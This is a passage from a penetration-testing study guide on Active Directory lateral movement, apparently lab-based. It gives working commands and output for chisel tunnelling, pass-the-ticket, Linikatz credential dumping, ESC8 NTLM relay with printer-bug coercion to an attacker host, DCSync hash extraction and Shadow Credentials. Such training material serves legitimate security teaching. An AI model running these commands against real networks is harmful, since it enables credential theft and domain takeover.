# 2025/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
# 2025/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

---

**Connect to MS01 with xfreerdp**

```bash
xfreerdp /v:<IP> /u:<USER> /d:<corp.rth> /p:<PASSWORD> /dynamic-resolution
```

---

**Execute chisel from MS01**

```cmd
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

**Expected Output**

```cmd
2025/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2025/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

---

**Setting the KRB5CCNAME environment variable**

```bash
export KRB5CCNAME=/home/<USER>/krb5cc_647401106_I8I133
```

> **Note:** If you are not familiar with file transfer operations, check out the module [FILE TRANSFERS](./04-file-transfers.md).

---

<details>
<summary><h5>Impacket (with proxychains if needed)</h5></summary>

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.

**Use Impacket with proxychains and Kerberos authentication**

```bash
proxychains impacket-wmiexec dc01 -k
```

**Expected Output**

```bash
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.14
# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
# [*] SMBv3.0 dialect used
# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
# [!] Launching semi-interactive shell - Careful what you execute
# [!] Press help for extra shell commands
```

**Confirm current user**

```cmd
whoami
```

**Expected Output**

```cmd
<corp.rth>\julio
```

> **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

</details>

<details>
<summary><h5>Evil-WinRM</h5></summary>

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name, and the KDC is the DC01.

**Install Kerberos authentication package**

```bash
sudo apt-get install krb5-user -y
```

In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:

**Kerberos configuration file:**


```bash
# [libdefaults]
#         default_realm = <CORP.RTH>

# ...

# [realms]
#     <CORP.RTH> = {
#         kdc = dc01.<corp.rth>
#     }

# ...
```

**Use Evil-WinRM with Kerberos**

```bash
proxychains evil-winrm -i dc01 -r <corp.rth>
```

**Expected Output**

```bash
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.14

# Evil-WinRM shell v3.3
# ...
# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
```

**Confirm current user**

```powershell
*Evil-WinRM* PS C:\Users\julio\Documents> whoami
```

**Expected Output**

```powershell
<corp.rth>\julio
```

**Confirm current host**

```powershell
*Evil-WinRM* PS C:\Users\julio\Documents> hostname
```

**Expected Output**

```powershell
DC01
```

</details>

</details>

<details>
<summary><h4>6. (Optional) Convert Ticket Formats</h4></summary>

If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

**Convert ccache to kirbi (Linux → Windows)**

```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

**Expected Output:**

```bash
# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

# [*] converting ccache to kirbi...
# [+] done
```

</details>

<details>
<summary><h4>7. (Optional) Import Ticket in Windows</h4></summary>

**Step 1: Import Ticket with Rubeus**

```cmd
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

**Expected Output**

```bash
#    ______        _
#   (_____ \      | |
#    _____) )_   _| |__  _____ _   _  ___
#   |  __  /| | | |  _ \| ___ | | | |/___)
#   | |  \ \| |_| | |_) ) ____| |_| |___ |
#   |_|   |_|____/|____/|_____)____/(___/

#   v2.1.2


# [*] Action: Import Ticket
# [+] Ticket successfully imported!
```

**Step 2: Verify Ticket with klist**

```cmd
klist
```

**Expected Output**

```bash
# Current LogonId is 0:0x31adf02

# Cached Tickets: (1)

# #0>     Client: julio @ <CORP.RTH>
#         Server: krbtgt/<CORP.RTH> @ <CORP.RTH>
#         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
#         Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
#         Start Time: 10/10/2025 5:46:02 (local)
#         End Time:   10/10/2025 15:46:02 (local)
#         Renew Time: 10/11/2025 5:46:02 (local)
#         Session Key Type: AES-256-CTS-HMAC-SHA1-96
#         Cache Flags: 0x1 -> PRIMARY
#         Kdc Called:

```

**Step 3: Access Network Share**

```cmd
dir \\dc01\julio
```

**Expected Output**

```bash
#  Volume in drive \\dc01\julio has no label.
#  Volume Serial Number is B8B3-0D72

#  Directory of \\dc01\julio

# 07/14/2025  07:25 AM    <DIR>          .
# 07/14/2025  07:25 AM    <DIR>          ..
# 07/14/2025  04:18 PM                17 julio.txt
#                1 File(s)             17 bytes
#                2 Dir(s)  18,161,782,784 bytes free
```

</details>

<details>
<summary><h4>8. (Optional) Use Linikatz for Automated Extraction</h4></summary>

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a credential dumping tool developed by Cisco’s security team, designed to exploit Linux systems integrated with Active Directory. It brings the same concept as Mimikatz, but tailored for UNIX environments.

Like Mimikatz, Linikatz requires root privileges to operate. Once executed, it extracts credentials—including Kerberos tickets—from various implementations such as FreeIPA, SSSD, Samba, and Vintella. The dumped credentials are stored in a folder prefixed with linikatz. and are available in multiple formats, including ccache and keytab.

**Download Linikatz**

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
```

**Run Linikatz**

```bash
bash linikatz.sh
```

```bash
#  _ _       _ _         _
# | (_)_ __ (_) | ____ _| |_ ____
# | | | '_ \| | |/ / _` | __|_  /
# | | | | | | |   < (_| | |_ / /
# |_|_|_| |_|_|_|\_\__,_|\__/___|

#              =[ @timb_machine ]=

# I: [freeipa-check] FreeIPA AD configuration
# -rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
# -rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
# -rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
# -rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
# -rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
# -rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
# -rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
# I: [sss-check] SSS AD configuration
# -rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_<corp.rth>.ldb
# -rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
# -rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_<CORP.RTH>
# -rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_<CORP.RTH>.ldb
# -rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
# -rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
# -rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
# -rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
# -rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
# -rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
# -rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
# -rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.<CORP.RTH>
# -rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
# I: [vintella-check] VAS AD configuration
# I: [pbis-check] PBIS AD configuration
# I: [samba-check] Samba configuration
# -rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
# -rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
# I: [kerberos-check] Kerberos configuration
# -rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
# -rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
# -rw------- 1 julio@<corp.rth> domain users@<corp.rth> 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
# -rw------- 1 julio@<corp.rth> domain users@<corp.rth> 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
# -rw------- 1 carlos@<corp.rth> domain users@<corp.rth> 3175 Oct 10 19:55 /tmp/krb5cc_647402606
# I: [samba-check] Samba machine secrets
# I: [samba-check] Samba hashes
# I: [check] Cached hashes
# I: [sss-check] SSS hashes
# I: [check] Machine Kerberos tickets
# I: [sss-check] SSS ticket list
# Ticket cache: FILE:/var/lib/sss/db/ccache_<CORP.RTH>
# Default principal: LINUX01$@<CORP.RTH>

# Valid starting       Expires              Service principal
# 10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/<CORP.RTH>@<CORP.RTH>
#     renew until 10/11/2022 19:48:03, Flags: RIA
#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
# I: [kerberos-check] User Kerberos tickets
# Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
# Default principal: julio@<CORP.RTH>

# Valid starting       Expires              Service principal
# 10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/<CORP.RTH>@<CORP.RTH>
#     renew until 10/08/2022 11:32:01, Flags: FPRIA
#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
# Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
# Default principal: julio@<CORP.RTH>

# Valid starting       Expires              Service principal
# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<CORP.RTH>@<CORP.RTH>
#     renew until 10/11/2022 19:55:02, Flags: FPRIA
#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
# Ticket cache: FILE:/tmp/krb5cc_647402606
# Default principal: svc_workstations@<CORP.RTH>

# Valid starting       Expires              Service principal
# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<CORP.RTH>@<CORP.RTH>
#     renew until 10/11/2022 19:55:02, Flags: FPRIA
#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
# I: [check] KCM Kerberos tickets
```

</details>

</details>

</details>

<details>
<summary><h2>Pass the Certificate</h2></summary>

[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for Public Key Cryptography for Initial Authentication, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. Pass-the-Certificate refers to the technique of using X.509 certificates to successfully obtain Ticket Granting Tickets (TGTs). This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

<details>
<summary><h3>AD CS NTLM Relay Attack (ESC8)</h3></summary>

ESC8—as described in the [`Certified Pre-Owned`](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, including web enrollment, which by default occurs over HTTP.

Attackers can enumerate the certificate template which is used by Domain Controllers for authentication with tools like [`certipy`](https://github.com/ly4k/Certipy?tab=readme-ov-file), and use Impacket’s [`ntlmrelayx`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service.

**Enumerate the certificate template**

```bash
certipy find -u '<USER>@<corp.local>' -p '<PASSWORD>' -dc-ip '<IP>' -text -enabled -hide-admins
```

**Run impacket-ntlmrelayx** 

```bash
impacket-ntlmrelayx -t http://<IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> **Note:** The value passed to --template may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication.

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the Printer Spooler service running. The command below forces **DC01_IP** to attempt authentication against **ATTACKER_IP**:

**Run printerbug.py**

```bash
python3 printerbug.py <CORP.LOCAL>/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
```

**Expected output**

```bash
# [*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

# [*] Attempting to trigger authentication via rprn RPC at <DC01_IP>
# [*] Bind OK
# [*] Got handle
# RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
# [*] Triggered RPC backconnect, this may or may not have worked
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for **DC01$**:

```bash
# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

# [*] Protocol Client SMTP loaded..
# [*] Protocol Client SMB loaded..
# [*] Protocol Client RPC loaded..
# [*] Protocol Client MSSQL loaded..
# [*] Protocol Client LDAPS loaded..
# [*] Protocol Client LDAP loaded..
# [*] Protocol Client IMAP loaded..
# [*] Protocol Client IMAPS loaded..
# [*] Protocol Client HTTP loaded..
# [*] Protocol Client HTTPS loaded..
# [*] Protocol Client DCSYNC loaded..
# [*] Running in relay mode to single host
# [*] Setting up SMB Server on port 445
# [*] Setting up HTTP Server on port 80
# [*] Setting up WCF Server on port 9389
# [*] Setting up RAW Server on port 6666
# [*] Multirelay disabled

# [*] Servers started, waiting for connections
# [*] SMBD-Thread-5 (process_request_thread): Received connection from <DC01_IP>, attacking target http://10.129.234.110
# [*] HTTP server returned error code 404, treating as a successful login
# [*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
# [*] SMBD-Thread-7 (process_request_thread): Received connection from <DC01_IP>, attacking target http://10.129.234.110
# [-] Authenticating against http://10.129.234.110 as / FAILED
# [*] Generating CSR...
# [*] CSR generated!
# [*] Getting certificate...
# [*] GOT CERTIFICATE! ID 8
# [*] Writing PKCS#12 certificate to ./DC01$.pfx
# [*] Certificate successfully written to file
```

We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).

**Install oscrypto**

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

**Clone the repository and install the dependencies**

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

>Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

**Run PKINIT**

```bash
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
```

**Expected Output**

```bash
# 2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
# INFO:minikerberos:Loading certificate and key from file
# 2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
# INFO:minikerberos:Requesting TGT
# 2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
# INFO:minikerberos:AS-REP encryption key (you might need this later):
# 2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
# INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
# 2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
# INFO:minikerberos:Saved TGT to file
```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<CORP.RTH>/DC01$'@DC01.<CORP.RTH>
```

**Expected Output**

```bash
# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
```

</details>

<details>
<summary><h3>Shadow Credentials (msDS-KeyCredentialLink)</h3></summary>

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. 

**Generate a X.509 certificate and write the public key to the victim user's msDS-KeyCredentialLink attribute**

```bash
pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u wwhite -p '<PASSWORD>' --target <USER> --action add
```

**Expected Output**

```bash
# [*] Searching for the target account
# [*] Target user found: CN=<FULL NAME>,CN=Users,DC=<corp>,DC=local
# [*] Generating certificate
# [*] Certificate generated
# [*] Generating KeyCredential
# [*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
# [*] Updating the msDS-KeyCredentialLink attribute of <USER>
# [+] Updated the msDS-KeyCredentialLink attribute of the target object
# [*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
# [+] PFX exportiert nach: eFUVVTPf.pfx
# [i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
# [+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
# [*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
# [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

In the output above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown.

**Use this file with gettgtpkinit.py to acquire a TGT as the victim**

```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip <DC01_IP> CORP.LOCAL/<USER> /tmp/<USER>.ccache
```

**Expected Output**

```bash
# 2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
# INFO:minikerberos:Loading certificate and key from file
# 2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
# INFO:minikerberos:Requesting TGT
# 2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
# INFO:minikerberos:AS-REP encryption key (you might need this later):
# 2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
# INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
# 2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
# INFO:minikerberos:Saved TGT to file
```

**With the TGT obtained, we may once again pass the ticket**

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

**Expected Output**

```bash
# Ticket cache: FILE:/tmp/jpinkman.ccache
# Default principal: jpinkman@<CORP.LOCAL>

# Valid starting       Expires              Service principal
# 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/<CORP.LOCAL>@<CORP.LOCAL>
```

In this case, we discovered that the victim user is a member of the **Remote Management Users** group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```bash
evil-winrm -i dc01.<corp.local> -r <corp.local>
```

**Expected Output:**

```bash
# Evil-WinRM shell v3.7

# Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

# Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

# Info: Establishing connection to remote endpoint
# *Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
# <corp>\jpinkman
```

</details>

<details>
<summary><h3>No PKINIT?</h3></summary>

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://github.com/AlmondOffSec/PassTheCert/).

</details>

<details>
<summary><h3>Onwards</h3></summary>

Now that we've seen how to perform various lateral movement techniques from Windows and Linux hosts, we'll pivot to a new focus: password management.

</details>

</details>

</details>

---

📘 **Next step:** Continue with [COMMON SERVICES](./08-common-services.md)